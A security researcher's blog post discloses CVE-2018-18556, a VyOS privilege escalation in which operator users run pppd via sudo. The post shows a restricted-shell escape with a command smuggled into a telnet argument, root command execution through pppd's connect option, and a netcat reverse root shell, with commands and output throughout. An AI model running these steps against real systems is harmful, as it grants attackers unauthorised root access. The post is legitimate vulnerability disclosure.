First – let’s escape the restricted shell leveraging [CVE-2018-18555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18555) and show that it’s a non-root user.

> user1@vyos> id
>
> Invalid command: [id]
>
> user1@vyos> telnet “127.0.0.1;/bin/bash”
>
> telnet: can’t connect to remote host (127.0.0.1): Connection refused
>
> user1@vyos> id
>
> uid=1001(user1) gid=100(users) groups=100(users),37(operator)
>
> Note: Some groups were omitted for formatting reasons

List the sudo rules with sudo -ll.  Note: output has been trimmed for brevity.

> user1@vyos> sudo -ll
>
> Matching Defaults entries for user1 on this host:
>
> env\_reset, syslog\_goodpri=info, env\_keep+=VYATTA\_\*
>
> User user1 may run the following commands on this host:
>
> Sudoers entry:
>
> RunAsUsers: root
>
> Commands:
>
> **/sbin/pppd**, /sbin/poff, /usr/sbin/pppstats

Every command listed should be reviewed. The man and info pages is a great resource to learn about a command. For pppd, the connect option caught my attention. It appears that you can pass an arbitrary command/script.

> **connect** script
>
> Usually there is something which needs to be done to prepare the link before the PPP protocol can be started; for instance, with a dial-up modem, commands need to be sent to the modem to dial the appropriate phone number. **This option specifies an command for pppd to execute (by passing it to a shell) before attempting to start PPP negotiation.** The chat (8) program is often useful here, as it provides a way to send arbitrary strings to a modem and respond to received characters. A value for this option from a privileged source cannot be overridden by a non-privileged user.

As a test I created a shell script with the id command. This worked but pppd spewed a bunch of non-printable characters back to the current session and did not release the terminal. I could have just as easily added commands to create a setuid shell or added a root account. There are endless possibilities but I wanted to see what other options to get an interactive shell.

> user1@vyos> echo “id >/dev/tty” > id.sh
>
> user1@vyos> chmod 755 id.sh
>
> user1@vyos> sudo /sbin/pppd connect $PWD/id.sh
>
> **uid=0(root) gid=0(root) groups=0(root)**
>
> ~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}(}”+}”~~�}#�!}!}!} }4}”}&} } } } }%}&���}’}”}

Because pppd does not release the terminal when executing the connect script there isn’t a clean way to get an interactive shell in the current terminal.  For this test I opened a second ssh session and started a netcat listener.

> user1@vyos> telnet “127.0.0.1;/bin/bash”
>
> telnet: can’t connect to remote host (127.0.0.1): Connection refused
>
> user1@vyos> netcat -v -l -p 9003
>
> listening on [any] 9003 …

Now pass netcat as the connect option to pppd. Fortunately the bundled netcat binary was compiled with the -e(exec) option enabled.

> user1@vyos> sudo pppd connect “netcat -e /bin/bash 127.0.0.1 9003”

Boom! A reverse root shell is received.

> connect to [127.0.0.1] from localhost [127.0.0.1] 32772
>
> id
>
> uid=0(root) gid=0(root) groups=0(root)

---

At this point I wanted to see what other pppd options might be vulnerable. Three other parameters also take an arbitrary script/command as an argument – disconnect, init, and welcome and can be leveraged using the same method. The “plugin” option also looked promising.

> **plugin** filename
>
> **Load the shared library object file filename as a plugin**. This is a privileged option. If file-name does not contain a slash (/), pppd will look in the /usr/lib/pppd/version directory for the plugin, where version is the version number of pppd (for example, 2.4.2).

Because a compiler is not installed on VyOS by default I used a CentOS 7 system and created a simple a shared library to execute /bin/sh when loaded. Once I had a working PoC I copied over the library to test it on the VyOS system.  Full PoC available at [CVE-2018-18556.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/VyOS/CVE-2018-18556.sh)

> user1@vyos> id
>
> uid=1001(user1) gid=100(users) groups=100(users),37(operator)
>
> user1@vyos> ./CVE-2018-18556.sh
>
> sh-4.1# id
>
> uid=0(root) gid=0(root) groups=0(root)
>
> sh-4.1#

Next steps:

* Submit a pull request to the [FallofSudo](https://github.com/Critical-Start/FallofSudo) project from [@paragonsec](https://twitter.com/paragonsec) to add the pppd command.
* Continue to review other sudo rules for VyOS operators.

### Share this:

* [Twitter](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)

## Post navigation

[CVE-2018-19788 PoC – polkit: Improper handling of user with uid > INT\_MAX leading to authentication bypass](https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/)

### Leave a comment [Cancel reply](/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/#respond)

Δ

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* [Comment](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/#respond)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F11%252F05%252Fcve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2018%252F11%252F05%252Fcve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users%252F)
  + [Copy shortlink](https://wp.me/paoR5j-2r)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/151)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)


